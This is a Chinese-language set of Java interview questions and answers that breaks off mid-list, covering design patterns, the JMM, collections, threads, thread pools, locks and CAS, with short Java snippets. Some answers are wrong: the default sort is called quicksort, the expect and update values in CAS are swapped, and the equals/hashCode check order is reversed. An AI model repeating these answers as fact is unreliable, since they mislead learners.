模板方法模式； 模板方法模式：模板方法模式是一种基于继承的设计模式概念：定义一个算法中的操作框架，而将一些步骤延迟到子类中。使得子类可以不改变算法的结构即可重定义该算法的某些特定步骤。说的通俗一点，就是为子类设计一个模板以便于子类复用里面的方法。为了避免子类恶意修改方法的实现细节，一般模板方法模式都会在方法上加final。 模板方法模式的优点 封装不变部分，扩展可变部分。把认为不变部分的算法封装到父类中实现，而可变部分的则可以通过继承来继续扩展。 提取公共部分代码，便于维护。 行为由父类控制，子类实现。 模板方法模式的缺点按照设计习惯，抽象类负责声明最抽象、最一般的事物属性和方法，实现类负责完成具体的事务属性和方法，但是模板方式正好相反，子类执行的结果影响了父类的结果，会增加代码阅读的难度。 模板方法模式的使用场景 多个子类有共有的方法，并且逻辑基本相同 重要、复杂的算法，可以把核心算法设计为模板方法，周边的相关细节功能则由各个子类实现 重构时，模板方法是一个经常使用的方法，把相同的代码抽取到父类中，然后通过构造函数约束其行为。 发布/订阅使用场景； 这个开放性题目，随便说发布订阅模式从广义上讲是一种观察者模式的实现，并且从解耦和重用角度来看，更优于典型的观察者模式。观察者模式在软件设计中是一个对象，维护一个依赖列表，当任何状态发生改变自动通知它们观察者模式简单的可以理解为：一个狗仔队为了获取到某超火人气明星的一首资料，得时时刻刻盯着，一旦有点风吹草动都知道，恨不得所有事情都围绕这个事去做。在观察者模式中，观察者是知道Subject的，Subject一直保持对观察者进行记录。然而，在发布订阅模式中，发布者和订阅者不知道对方的存在。它们只有通过消息代理进行通信。在发布-订阅模式，消息的发送方，叫做发布者（publishers），消息不会直接发送给特定的接收者（订阅者），意思就是发布者和订阅者不知道对方的存在。需要一个第三方组件，叫做信息中介，它将订阅者和发布者串联起来，它过滤和分配所有输入的消息。换句话说，发布-订阅模式用来处理不同系统组件的信息交流，即使这些组件不知道对方的存在观察者模式大多数时候是同步的，比如当事件触发，Subject就会去调用观察者的方法。而发布-订阅模式大多数时候是异步的（使用消息队列）。 KMP算法（一种改进的字符串匹配算法）； KMP算法是一种改进后的字符串匹配算法，由D.E.Knuth与V.R.Pratt和J.H.Morris同时发现，因此人们称它为克努特－莫里斯－普拉特操作（简称KMP算法）具体实现就是实现一个next()函数，函数本身包含了模式串的局部匹配信息看了一篇文章，写得不错：https://www.cnblogs.com/xiaoyulong/p/8783029.html JMM里边的原子性、可见性、有序性是如何体现出来的，JMM中内存屏障是什么意思， JMM：Java Memory Model(Java内存模型)，围绕着在并发过程中如何处理可见性、原子性、有序性这三个特性而建立的模型。 可见性：JMM提供了volatile变量定义、final、synchronized块来保证可见性。例如：线程a在将共享变量x=1写入主内存的时候，如何保证线程b读取共享变量x的值为1，这就是JMM做的事情。JMM通过控制主内存与每个线程的本地内存之间的交互，来为java程序员提供内存可见性保证。 原子性：JMM提供保证了访问基本数据类型的原子性（其实在写一个工作内存变量到主内存是分主要两步：store、write），但是实际业务处理场景往往是需要更大的范围的原子性保证，所以模型也提供了synchronized块来保证 有序性：这个概念是相对而言的，如果在本线程内，所有的操作都是有序的，如果在一个线程观察另一个线程，所有的操作都是无序的，前句是“线程内表现为串行行为”，后句是“指令的重排序”和“工作内存和主内存同步延迟”现象，模型提供了volatile和synchronized来保证线程之间操作的有序性。 内存屏障（Memory barrier） 简介程序在运行时内存实际的访问顺序和程序代码编写的访问顺序不一定一致，这就是内存乱序访问。内存乱序访问行为出现的理由是为了提升程序运行时的性能。内存乱序访问主要发生在两个阶段：编译时，编译器优化导致内存乱序访问（指令重排）运行时，多 CPU 间交互引起内存乱序访问 重排序：在执行程序时为了提高性能，编译器和处理器常常会对指令做重排序(编译器、处理器)，就是因为这些重排序，所以可能会导致多线程程序出现内存可见性问题(数据安全问题)和有序性问题。 JMM是如何处理的呢？对于编译器，JMM的编译器重排序规则会禁止特定类型的编译器重排序对于处理器重排序，JMM的处理器重排序规则会要求java编译器在生成指令序列时，插入特定类型的内存屏障（memory barriers，intel称之为memory fence）指令，通过内存屏障指令来禁止特定类型的处理器重排序总之一句话，JMM是通过禁止特定类型的编译器重排序和处理器重排序来为程序员提供一致的内存可见性保证。 说说自定义注解的场景及实现 Java自定义注解是通过运行时靠反射获取注解。实际开发中，例如我们要获取某个方法的调用日志，可以通过AOP（动态代理机制）给方法添加切面，通过反射来获取方法包含的注解，如果包含日志注解，就进行日志记录。有篇文章不错：http://www.cnblogs.com/digdeep/p/4525567.html Session与Cookie区别 这属于一个开放性的题目，可以扯一些和其相关的东西即可。Session是Web程序中常用的技术，用来跟踪用户的整个会话。常用的会话跟踪技术是Cookie与Session。Cookie通过在客户端记录信息确定用户身份，Session通过在服务器端记录信息确定用户身份。具体详情可参考:http://www.cnblogs.com/linguoguo/p/5106618.html 列出自己常用的JDK包 比如： java.lang –语言包 这是Java语言的核心包，系统自动将这个包引入到用户程序，该包中主要类有:Object、数据类型包装类、数学类Math、字符串类String和StringBuffer类、系统和运行时类、线程类… java.util –实用工具包 提供了各种实用功能的类，主要包括日期类、数据结构类和随机数类等。 比如：Date、Calendar、LinkedList、List、Random … java.io –输入输出包 提供了系统输入输出类和接口，只要包括输入流类InputStream和输出流OutputStream就可以实现文件的输入输出、管道的数据传输以及网络数据传输的功能 . java.net –网络函数包 提供了实现网络应用程序的类，主要包括用于实现Socket通信的Socket类，此外还提供了便于处理URL的类 java.sql –数据库API包 提供了与数据库连接的很多接口类：DriverManager 类（建立与驱动程序的连接）、Driver 接口（提供用来注册和连接基于 JDBC 技术的驱动程序的 API）、SQLException（SQL 异常类）…. MVC设计思想 （开放性答案，按自己的理解来回答）MVC英文即Model-View-Controller，即把一个应用的输入、处理、输出流程按照Model、View、Controller的方式进行分离，这样一个应用被分成三个层——模型层、视图层、控制层。MVC应用程序总是由三个部分组成.Event(事件)导致Controller改变Model或View,或者同时改变两者.只要Controller改变了Models的数据或者属性，所有依赖的View都会自动更新.类似的,只要Controller改变了View，View会从潜在的Model中获取数据来刷新自己 equals与==的区别 ==：比较的是变量(栈)内存中存放的对象的(堆)内存地址，用来判断两个对象的地址是否相同，即是否是指相同一个对象。比较的是真正意义上的指针操作。equals：用来比较的是两个对象的内容是否相等，由于所有的类都是继承自java.lang.Object类的，所以适用于所有对象，如果没有对该方法进行覆盖的话，调用的仍然是Object类中的方法，而Object中的equals方法返回的却是==的判断。 hashCode和equals方法的区别与联系 hashCode()方法和equal()方法的作用都是用来对比两个对象是否相等一致,相同的功能为什么需要两个，请听我一一道来因为重写的equal（）里一般比较的比较全面比较复杂，这样效率就比较低，而利用hashCode()进行对比，则只要生成一个hash值进行比较就可以了，效率很高，那么hashCode()既然效率这么高为什么还要equal()呢？因为hashCode()并不是完全可靠1、equal()相等的两个对象他们的hashCode()肯定相等，也就是用equal()对比是绝对可靠的。2、hashCode()相等的两个对象他们的equal()不一定相等，也就是hashCode()不是绝对可靠的。所以解决方式是，每当需要对比的时候，首先用hashCode()去对比，如果hashCode()不一样，则表示这两个对象肯定不相等（也就是不必再用equal()去再对比了）,如果hashCode()相同，此时再对比他们的equal()，如果equal()也相同，则表示这两个对象是真的相同了，这样既能大大提高了效率也保证了对比的绝对正确性！ 若hashcode方法永远返回1或者一个常量会产生什么结果？ 所有对象都出现hash冲突，而hashCode()本身的性能也会降级。为啥呢？你问我，我也不知道啊，你去看看哈希算法呗，但是呢，可以打个比方：一个10000页的书，目录中的页码全是第一页。你找东西肯定很麻烦 toString()方法什么情况下需要重写； 其实这个方法的目的，主要就是将对象按字符串的方式输出出来,反过来的话，假如没有toString(0方法，那我们所得到的一个对象，是完全不知道里面拥有什么样的值 判断对象相等时，什么情况下只需要重写 equals()，什么情况下需要重写 equals(),hashcode()？ 1、当我们只需要对象的内容相等时，就表示它相同，那只需要重写equals 方法即可。2、重写equals方法时需要重写hashCode方法，主要是针对Map、Set等集合类型的使用；集合类判断两个对象是否相等，是先判断equals是否相等，如果equals返回TRUE，还要再判断HashCode返回值是否ture,只有两者都返回ture,才认为该两个对象是相等的。 什么是Java序列化和反序列化，如何实现Java序列化？或者请解释Serializable 接口的作用 把JAVA对象转换为字节序列的过程就称为对象的序列化，将字节序列恢复成Java对象的过程称为对象的反序列化只有实现了 serializable和Externalizable接口的类的对象才能被序列化 后者是前者的子类 实现这个接口的类完全由自身来控制序列化的行为，而仅仅实现前者的类可以采用默认的序列化方式。实现这两个接口 标志着对象可以被序列化了。。。 Object类中常见的方法，为什么wait notify会放在Object里边？ 简单说：因为synchronized中的这把锁可以是任意对象，所以任意对象都可以调用wait()和notify()；所以wait和notify属于Object。专业说：因为这些方法在操作同步线程时，都必须要标识它们操作线程的锁，只有同一个锁上的被等待线程，可以被同一个锁上的notify唤醒，不可以对不同锁中的线程进行唤醒。也就是说，等待和唤醒必须是同一个锁。而锁可以是任意对象，所以可以被任意对象调用的方法是定义在object类中。扩展：在jdk1.5以后，将同步synchronized替换成了Lock，将同步锁对象换成了Condition对象，并且Condition对象可以有多个 Java的平台无关性如何体现出来的 Java从四个方面支持了平台无关性最主要的是Java平台本身。 Java平台扮演Java程序和所在的硬件与操作系统之间的缓冲角色。这样Java程序只需要与Java平台打交道，而不用管具体的操作系统。 Java语言保证了基本数据类型的值域和行为都是由语言自己定义的。而C/C++中，基本数据类是由它的占位宽度决定的，占位宽度由所在平台决定的。不同平台编译同一个C++程序会出现不同的行为。通过保证基本数据类型在所有平台的一致性，Java语言为平台无关性提供强有力的支持。 Java class文件。Java程序最终会被编译成二进制class文件。class文件可以在任何平台创建，也可以被任何平台的Java虚拟机装载运行。它的格式有着严格的定义，是平台无关的。 可伸缩性。Sun通过改变API的方式得到三个基础API集合，表现为Java平台不同的伸缩性：J2EE,J2SE,J2ME。 JDK和JRE的区别 简单的说，jre 是运行环境，jdk 是开发环境 Java 8有哪些新特性 1、Lambda表达式和函数式接口1Arrays.asList( &quot;a&quot;, &quot;b&quot;, &quot;d&quot; ).forEach( e -&gt; System.out.println( e ) ); 如果Lambda表达式需要更复杂的语句块，则可以使用花括号将该语句块括起来，类似于Java中的函数体，例如： 1234Arrays.asList( &quot;a&quot;, &quot;b&quot;, &quot;d&quot; ).forEach( e -&gt; &#123; System.out.print( e ); System.out.print( e );&#125; ); 2、接口的默认方法和静态方法默认方法和抽象方法之间的区别在于抽象方法需要实现，而默认方法不需要。接口提供的默认方法会被接口的实现类继承或者覆写，例子代码如下： 12345678910111213141516private interface Defaulable &#123; // Interfaces now allow default methods, the implementer may or // may not implement (override) them. default String notRequired() &#123; return &quot;Default implementation&quot;; &#125; &#125;private static class DefaultableImpl implements Defaulable &#123;&#125;private static class OverridableImpl implements Defaulable &#123; @Override public String notRequired() &#123; return &quot;Overridden implementation&quot;; &#125;&#125; Defaulable接口使用关键字default定义了一个默认方法notRequired()。DefaultableImpl类实现了这个接口，同时默认继承了这个接口中的默认方法；OverridableImpl类也实现了这个接口，但覆写了该接口的默认方法，并提供了一个不同的实现。Java 8带来的另一个有趣的特性是在接口中可以定义静态方法，例子代码如下：123456private interface DefaulableFactory &#123; // Interfaces now allow static methods static Defaulable create( Supplier&lt; Defaulable &gt; supplier ) &#123; return supplier.get(); &#125;&#125; 下面的代码片段整合了默认方法和静态方法的使用场景： 123456789101112public static void main( String[] args ) &#123; Defaulable defaulable = DefaulableFactory.create( DefaultableImpl::new ); System.out.println( defaulable.notRequired() ); defaulable = DefaulableFactory.create( OverridableImpl::new ); System.out.println( defaulable.notRequired() );&#125;//这段代码的输出结果如下：// Default implementation//Overridden implementation 3、方法引用 4、重复注解 5、更好的类型推断 6、拓宽注解 可参考：https://blog.csdn.net/u014470581/article/details/54944384 Java 8流式迭代的好处？ 使代码变得更加紧凑，可读性增强，并行操作大集合变得很方便，可以充分发挥多核 CPU 的优势，更易于为多核处理器编写代码； 项目中用到的JDK的哪些特性？ 用到什么说什么,Lambda表达式 什么的 Java Collections和Arrays的sort方法默认的排序方法是什么； 快速排序 引用计数法与GC Root可达性分析法区别； 引用计数法(ReferenceCounting):每当有一个地方引用他时，计数器值就+1,；当引用失效时，计数器值就-1；任何时刻计数器为0的对象就是不可能在被使用，不会完全准确，因为如果出现两个对象相互引用的问题就不行了。 可达性分析算法(Reachability Analysis)：通过一系列的GC Roots的对象作为起始点，从这些根节点开始向下搜索，搜索所走过的路径称为引用链（Reference Chain），当一个对象到GC Roots没有任何引用链相连时，则证明此对象是不可用的。可参考：http://baijiahao.baidu.com/s?id=1583441733083989684&amp;wfr=spider&amp;for=pc 浅拷贝和深拷贝的区别； 浅拷贝 只是对指针的拷贝，拷贝后两个指针指向同一个内存空间，深拷贝 不但对指针进行拷贝，而且对指针指向的内容进行拷贝，经深拷贝后的指针是指向两个不同地址的指针。可参考：https://blog.csdn.net/wangxueming/article/details/52034841 String s=”abc”和String s=new String(“abc”)区别； String s=”abc”;这里不会在堆中创建对象，首先在常量池寻找这个常量“abc”，如果没有“abc”则把abc存放到运行时常量池，然后把引用赋值给是s，如果有就直接把存在的地址赋值给s。String s=new String(“abc”);首先在堆中创建对象，然后再把对象引用赋值给s。 1.2、Java常见集合 Arraylist与LinkedList默认空间是多少； ArrayList 初始化大小是 10 ,JDK 1.7之后,扩容机制：当前容量的1.5倍赋值给新的容量linkedList 是一个双向链表，没有初始化大小，也没有扩容的机制，就是一直在前面或者后面新增就好。 List 和 Set 区别 List： 1.可以允许重复的对象。 2.可以插入多个null元素。 3.是一个有序容器，保持了每个元素的插入顺序，输出的顺序就是插入的顺序。 4.常用的实现类有 ArrayList、LinkedList 和 Vector。ArrayList 最为流行，它提供了使用索引的随意访问，而 LinkedList 则对于经常需要从 List 中添加或删除元素的场合更为合适。 Set： 1.不允许重复对象 2.无序容器，你无法保证每个元素的存储顺序，TreeSet通过 Comparator 或者 Comparable 维护了一个排序顺序。 3.只允许一个 null 元素 4.Set 接口最流行的几个实现类是 HashSet、LinkedHashSet 以及 TreeSet。最流行的是基于 HashMap 实现的 HashSet；TreeSet 还实现了 SortedSet 接口，因此 TreeSet 是一个根据其 compare() 和 compareTo() 的定义进行排序的有序容器。 Set和hashCode以及equals方法的联系 因为Set 不允许添加重复的元素，而保证元素对象是否相同，必须重写这两个方法。 Set内存放的元素为什么不可以重复，内部是如何保证和实现的？ Set 接口为我们提供了一个 add() 方法，add()方法里实际执行的是map的put方法,因为map中的key是不允许重复的，所以set中的元素不能重复. List 和 Map 区别 1.Map不是collection的子接口或者实现类。Map是一个接口。 2.Map 的 每个 Entry 都持有两个对象，也就是一个键一个值，Map 可能会持有相同的值对象但键对象必须是唯一的。 3.TreeMap 也通过 Comparator 或者 Comparable 维护了一个排序顺序。 4.Map 里你可以拥有随意个 null 值但最多只能有一个 null 键。 5.Map 接口最流行的几个实现类是 HashMap、LinkedHashMap、Hashtable 和 TreeMap。（HashMap、TreeMap最常用） Arraylist 与 LinkedList 区别 ArrayList、LinKedList都不是线程安全,Vector是线程安全Arraylist 底层数据结构是数组，查询快，增删慢LinkedList 底层数据结构是链表，查询慢，增删快 ArrayList和LinkList的删除一个元素的时间复杂度；（ArrayList是O(N)，LinkList是O(1)）； ArrayList 是线性表（数组）get() 直接读取第几个下标，复杂度 O(1)add(E) 添加元素，直接在后面添加，复杂度O（1）add(index, E) 添加元素，在第几个元素后面插入，后面的元素需要向后移动，复杂度O（n）remove（）删除元素，后面的元素需要逐个移动，复杂度O（n） LinkedList 是链表的操作get() 获取第几个元素，依次遍历，复杂度O(n)add(E) 添加到末尾，复杂度O(1)add(index, E) 添加第几个元素后，需要先查找到第几个元素，直接指针指向操作，复杂度O(n)remove（）删除元素，直接指针指向操作，复杂度O(1) ArrayList 与 Vector 区别 Vector的方法都是同步的(Synchronized),是线程安全的(thread-safe)，而ArrayList的方法不是，由于线程的同步必然要影响性能，因此,ArrayList的性能比Vector好。当Vector或ArrayList中的元素超过它的初始大小时,Vector会将它的容量翻倍,而ArrayList只增加50%的大小，这样,ArrayList就有利于节约内存空间。 HashMap 和 Hashtable 的区别 Hashtable和HashMap它们的性能方面的比较类似 Vector和ArrayList，比如Hashtable的方法是同步的,而HashMap的不是。 HashSet 和 HashMap 区别 HashMap 实现了Map接口，存储键值对，调用put 向map中添加元素,HashMap使用键（Key）计算HashcodeHashSet 实现Set接口,仅存储对象,调用add（）方法向Set中添加元素,HashSet使用成员对象来计算hashcode值，对于两个对象来说hashcode可能相同，所以equals()方法用来判断对象的相等性 HashMap 和 ConcurrentHashMap 的区别 一个线程不安全的，一个线程安全的 HashMap 的工作原理及代码实现，什么时候用到红黑树 工作原理及实现可参考：https://www.cnblogs.com/qlqwjy/p/8472325.html,什么时候用到 红黑树：在hash值相同的情况下（且重复数量大于8），用红黑树来管理数据。 红黑树相当于排序数据。可以自动的使用二分法进行定位。性能较高。 HashMap在什么时候时间复杂度是O（1），什么时候是O（n），什么时候又是O（logn）； 不懂没研究源码 多线程情况下HashMap死循环的问题 主要是多线程同时put时，如果同时触发了rehash操作，会导致HashMap中的链表中出现循环节点，进而使得后面get的时候，会死循环。可以参考这篇文章：https://blog.csdn.net/xuefeng0707/article/details/40797085 ConcurrentHashMap 的工作原理及代码实现，如何统计所有的元素个数 ConcurrentHashMap采用了非常精妙的”分段锁”策略，ConcurrentHashMap的主干是个Segment数组。如果我们要统计整个ConcurrentHashMap里元素的大小，就必须统计所有Segment里元素的大小后求和可以参考：http://ifeve.com/concurrenthashmap/ 手写简单的HashMap 你行，你上 看过那些Java集合类的源码 这就看个人学习能力了 CopyOnWriteArrayList是什么； CopyOnWriteArrayList这是一个ArrayList的线程安全的变体，其原理大概可以通俗的理解为:初始化的时候只有一个容器，很常一段时间，这个容器数据、数量等没有发生变化的时候，大家(多个线程)，都是读取(假设这段时间里只发生读取的操作)同一个容器中的数据，所以这样大家读到的数据都是唯一、一致、安全的，但是后来有人往里面增加了一个数据，这个时候CopyOnWriteArrayList 底层实现添加的原理是先copy出一个容器(可以简称副本)，再往新的容器里添加这个新的数据，最后把新的容器的引用地址赋值给了之前那个旧的的容器地址，但是在添加这个数据的期间，其他线程如果要去读取数据，仍然是读取到旧的容器里的数据。可参考：https://blog.csdn.net/hua631150873/article/details/51306021 1.3、进程和线程 线程和进程的概念、并行和并发的概念 并发指一个CPU可以异步的处理多个进程 并行则是一个CPU同时处理多个进程 进程是一个程序的实例。每个进程都有自己的虚拟地址空间和控制线程， 线程是操作系统调度器(Schduler)分配处理器时间的基础单元。 线程池的实现？四种线程池？重要参数及原理？任务拒接策略有哪几种？ 1234567891011121314151617181920212223242526272829303132333435363738//五个参数的构造函数public ThreadPoolExecutor(int corePoolSize, int maximumPoolSize, long keepAliveTime, TimeUnit unit, BlockingQueue&lt;Runnable&gt; workQueue)//六个参数的构造函数-1public ThreadPoolExecutor(int corePoolSize, int maximumPoolSize, long keepAliveTime, TimeUnit unit, BlockingQueue&lt;Runnable&gt; workQueue, ThreadFactory threadFactory)//六个参数的构造函数-2public ThreadPoolExecutor(int corePoolSize, int maximumPoolSize, long keepAliveTime, TimeUnit unit, BlockingQueue&lt;Runnable&gt; workQueue, RejectedExecutionHandler handler)//七个参数的构造函数public ThreadPoolExecutor(int corePoolSize, int maximumPoolSize, long keepAliveTime, TimeUnit unit, BlockingQueue&lt;Runnable&gt; workQueue, ThreadFactory threadFactory, RejectedExecutionHandler handler) // 参数解析// int corePoolSize：该线程池中核心线程数最大值// int maximumPoolSize： 该线程池中线程总数最大值// long keepAliveTime：该线程池中非核心线程闲置超时时长// TimeUnit unit：keepAliveTime的单位// BlockingQueue workQueue：该线程池中的任务队列：维护着等待执行的Runnable对象 常见四种线程池： CachedThreadPool可缓存线程池 FixedThreadPool 定长线程池 SingleThreadPool 单个工作线程 ScheduledThreadPool 有延迟执行和周期执行任务的线程池可参考：https://www.jianshu.com/p/ae67972d1156 进程间通信的方式 1 无名管道通信2 高级管道通信3 有名管道通信4 消息队列通信5 信号量通信6 信号7 共享内存通信8 套接字通信可参考：https://blog.csdn.net/violet_echo_0908/article/details/51201278 说说 CountDownLatch、CyclicBarrier 原理和区别 CountDownLatch CyclicBarrier 减计数方式 加计数方式 计算为0时释放所有等待的线程 计数达到指定值时释放所有等待线程 计数为0时，无法重置 计数达到指定值时，计数置为0重新开始 调用countDown()方法计数减一，调用await()方法只进行阻塞，对计数没任何影响 调用await()方法计数加1，若加1后的值不等于构造方法的值，则线程阻塞 不可重复利用 可重复利用 可参考:https://blog.csdn.net/tolcf/article/details/50925145 说说 Semaphore 原理 具体调用的还是AbstractQueuedSynchronizer这个类的逻辑,可参考 ：https://blog.csdn.net/buyaoxx/article/details/77935730 说说 Exchanger 原理 Exchanger，它允许在并发任务之间交换数据。具体来说，Exchanger类允许在两个线程之间定义同步点。当两个线程都到达同步点时，他们交换数据结构，因此第一个线程的数据结构进入到第二个线程中，第二个线程的数据结构进入到第一个线程中。可参考：https://blog.csdn.net/chenssy/article/details/72550933 ThreadLocal 原理分析，ThreadLocal为什么会出现OOM，出现的深层次原理 ThreadLocal用于保存某个线程共享变量：对于同一个static ThreadLocal，不同线程只能从中get，set，remove自己的变量，而不会影响其他线程的变量。ThreadLocal的实现是这样的：每个Thread 维护一个 ThreadLocalMap 映射表，这个映射表的 key 是 ThreadLocal实例本身，value 是真正需要存储的 ObjectThreadLocalMap使用ThreadLocal的弱引用作为key，如果一个ThreadLocal没有外部强引用来引用它，那么系统 GC 的时候，这个ThreadLocal势必会被回收，这样一来，ThreadLocalMap中就会出现key为null的Entry，就没有办法访问这些key为null的Entry的value，如果当前线程再迟迟不结束的话，这些key为null的Entry的value就会一直存在一条强引用链：Thread Ref -&gt; Thread -&gt; ThreaLocalMap -&gt; Entry -&gt; value永远无法回收，造成内存泄漏。可参考：https://blog.csdn.net/bntx2jsqfehy7/article/details/78315161 http://www.importnew.com/22039.html 讲讲线程池的实现原理 可参考:https://blog.csdn.net/gol_phing/article/details/49032055 线程池的几种实现方式 常见四种线程池： CachedThreadPool可缓存线程池 FixedThreadPool 定长线程池 SingleThreadPool 单个工作线程 ScheduledThreadPool 有延迟执行和周期执行任务的线程池 线程的生命周期，状态是如何转移的 （1）新建状态——（2）就绪状态—（（4）阻塞状态）—（3）运行状态——（5）死亡状态 AtomicInteger底层实现原理； AtomicInteger的核心就是一个CAS算法(CompareAndSwap)的乐观锁实现，比较并交换算法，此算法是由unsafe的底层代码实现，它是一个原子的操作，原理就是：如果内存中的实际值与update值相同，则将实际值更新为expect值，反之则返回失败，由上层系统循环获取实际值后，再次调用此CAS算法：可参考：https://www.cnblogs.com/mantu/p/5796450.html 、https://blog.csdn.net/qfycc92/article/details/46489553 synchronized与ReentraLock哪个是公平锁； 按照申请锁的顺序来一次获得锁称为公平锁，synchronized的是非公平锁，ReentrantLock分为“公平锁”和“非公平锁”。它们的区别体现在获取锁的机制上是否公平。可以通过构造函数实现公平锁。new RenentrantLock(boolean fair) CAS机制会出现什么问题； Java语言CAS底层如何实现？利用unsafe提供了原子性操作方法。会发生ABA问题？怎么解决？当一个值从A更新成B，又更新会A，普通CAS机制会误判通过检测。解决方法：利用版本号比较可以有效解决ABA问题。 用过并发包下边的哪些类； ConcurrentHashMap CopyOnWriteArrayList CopyOnWriteArraySet ArrayBlockingQueue Atomic ===&gt;AtomicInteger 、AtomicBoolean 线程状态以及API怎么操作会发生这种转换； t.sleep():继续持锁,不会释放.线程状态有运行转换为阻塞,当时间到达后有阻塞转换为可运行状态,执行该操作不会考虑优先级的问题.可以让优先级低的线程执行,当然这完全取决于调度机制.t.join():不涉及锁.仅仅是将其他的线程加入到当前线程.在其他线程没有完成之前当前线程处于阻塞状态.不建议使用.原因会阻塞当前线程.建议使用callback.t.wait():释放锁.一般该方法配合notify或者notifyAll使用可以达到线程协助的目的.释放之后进入等待该锁的队列中t.notify()/t.notifyAll():不持有锁.通过t.wait()释放锁后,其他等待该锁的一个或多个线程是否运行,完全取决于谁先获得锁.当然在采用notify的时候只能唤醒一个等待该锁的线程.只要获得相关资源并且被调度就可以执行 常用的避免死锁方法； 避免一个线程同时获取多个锁避免一个线程同时占用多个资源，尽量保证每个锁只占用一个资源尝试使用定时锁，使用lock.tryLock(timeout)来替代使用内部锁机制对于数据库锁，加锁和解锁必须在一个数据库连接里，否则会出现解锁失败的情况 一个线程连着调用start两次会出现什么情况？ 由于状态只有就绪、阻塞、执行，状态是无法由执行转化为执行的，所以会报不合法的状态！） wait方法能不能被重写？ wait是final类型的，不可以被重写，不仅如此，notify和notifyall都是final类型的），wait能不能被中断； 有三个线程T1 T2 T3，如何保证他们按顺序执行； 可以用线程类的join()方法在一个线程中启动另一个线程,另一个线程完成 123456789101112131415161718192021222324252627282930313233343536373839 public static void main(String[] args) &#123; final Thread t1 = new Thread(new Runnable() &#123; @Override public void run() &#123; System.out.println(&quot;t1&quot;); &#125; &#125;); final Thread t2 = new Thread(new Runnable() &#123; @Override public void run() &#123; try &#123; //引用t1线程，等待t1线程执行完 t1.join(); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; System.out.println(&quot;t2&quot;); &#125; &#125;); Thread t3 = new Thread(new Runnable() &#123; @Override public void run() &#123; try &#123; //引用t2线程，等待t2线程执行完 t2.join(); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; System.out.println(&quot;t3&quot;); &#125; &#125;); t3.start(); t2.start(); t1.start(); &#125; 有了进程为何还要线程呢，不同进程和线程他们之间有什么不同。 进程是资源管理的最小单位，线程是程序执行的最小单位。在操作系统设计上，从进程演化出线程，最主要的目的就是更好的支持SMP以及减小（进程/线程）上下文切换开销。） 1.4、锁机制 说说线程安全问题，什么是线程安全，如何保证线程安全 线程安全：就是多线程访问同一代码，不会产生不确定结果。（比如死锁）如何保证呢：1、使用线程安全的类2、使用synchronized同步代码块，或者用Lock锁3、多线程并发情况下，线程共享的变量改为方法局部级变量 重入锁的概念，重入锁为什么可以防止死锁 所谓重入锁，指的是以线程为单位，当一个线程获取对象锁之后，这个线程可以再次获取本对象上的锁，而其他的线程是不可以的 synchronized 和 ReentrantLock 都是可重入锁通过为每个锁关联一个请求计数和一个占有它的线程。当计数为0时，认为锁是未被占有的。线程请求一个未被占有的锁时，jvm讲记录锁的占有者，并且讲请求计数器置为1 。如果同一个线程再次请求这个锁，计数将递增；每次占用线程退出同步块，计数器值将递减。直到计数器为0,锁被释放。可参考:https://blog.csdn.net/joker_apple/article/details/52790181 产生死锁的四个条件（互斥、请求与保持、不剥夺、循环等待） （1）互斥条件：进程对所分配到的资源不允许其他进程进行访问，若其他进程访问该资源，只能等待，直至占有该资源的进程使用完成后释放该资源（2）请求和保持条件：进程获得一定的资源之后，又对其他资源发出请求，但是该资源可能被其他进程占有，此事请求阻塞，但又对自己获得的资源保持不放（3）不可剥夺条件：是指进程已获得的资源，在未完成使用之前，不可被剥夺，只能在使用完后自己释放（4）环路等待条件：是指进程发生死锁后，必然存在一个进程–资源之间的环形链 如何检查死锁（通过jConsole检查死锁） 可以使用 jstack或者pstack 和 gdb 工具对死锁程序进行分析。pstack： 功能是打印输出此进程的堆栈信息。可以输出所有线程的调用关系栈 jstack： jstack是java虚拟机自带的一种堆栈跟踪工具，所以仅适用于java程序，功能跟pstack一样，但是更强大，可以提示哪个地方可能死锁了。pstack和jstack判断死锁，都需要多执行几次命令，观察每次的输出结果，才能推测是否死锁了。 gdb：1 运行程序，设置能影响程序运行的参数和环境 ;2 控制程序在指定的条件下停止运行；3 当程序停止时，可以检查程序的状态；4 当程序 crash 时，可以检查 core 文件；5 可以修改程序的错误，并重新运行程序；6 可以动态监视程序中变量的值；7 可以单步执行代码，观察程序的运行状态。 volatile 实现原理 禁止指令重排、刷新内存 synchronized 实现原理 通过对象监视器保存同步,可参考：https://www.cnblogs.com/dpains/p/7205093.html?utm_source=itdadao&amp;utm_medium=referral synchronized 与 lock 的区别 两者区别：1.首先synchronized是java内置关键字，在jvm层面，Lock是个java类；2.synchronized无法判断是否获取锁的状态，Lock可以判断是否获取到锁；3.synchronized会自动释放锁(a 线程执行完同步代码会释放锁 ；b 线程执行过程中发生异常会释放锁)，Lock需在finally中手工释放锁（unlock()方法释放锁），否则容易造成线程死锁；4.用synchronized关键字的两个线程1和线程2，如果当前线程1获得锁，线程2线程等待。如果线程1阻塞，线程2则会一直等待下去，而Lock锁就不一定会等待下去，如果尝试获取不到锁，线程可以不用一直等待就结束了；5.synchronized的锁可重入、不可中断、非公平，而Lock锁可重入、可判断、可公平（两者皆可）6.Lock锁适合大量同步的代码的同步问题，synchronized锁适合代码少量的同步问题。参考：https://www.cnblogs.com/iyyy/p/7993788.html AQS同步队列 谈到并发，不得不谈ReentrantLock；而谈到ReentrantLock，不得不谈AbstractQueuedSynchronizer（AQS）！类如其名，抽象的队列式的同步器，AQS定义了一套多线程访问共享资源的同步器框架，许多同步类实现都依赖于它，如常用的ReentrantLock/Semaphore/CountDownLatch…可参考：https://www.cnblogs.com/waterystone/p/4920797.html CAS无锁的概念、乐观锁和悲观锁 无锁编程只保证单个读(本身就是原子的)和写操作的原子性，并不保证组合操作的原子性独占锁是一种悲观锁，synchronized就是一种独占锁，它假设最坏的情况，并且只有在确保其它线程不会造成干扰的情况下执行，会导致其它所有需要锁的线程挂起，等待持有锁的线程释放锁。而另一个更加有效的锁就是乐观锁。所谓乐观锁就是，每次不加锁而是假设没有冲突而去完成某项操作，如果因为冲突失败就重试，直到成功为止。 常见的原子操作类 从java1.5开始，jdk提供了java.util.concurrent.atomic包，这个包中的原子操作类，提供了一种用法简单，性能高效，线程安全的更新一个变量的方式。atomic包里面一共提供了13个类，分为4种类型，分别是：原子更新基本类型，原子更新数组，原子更新引用，原子更新属性，这13个类都是使用Unsafe实现的包装类。 原子更新基本类型 AtomicBoolean：原子更新布尔类型 AtomicInteger : 原子更新整型 AtomicLong：原子更新整型 原子更新数组 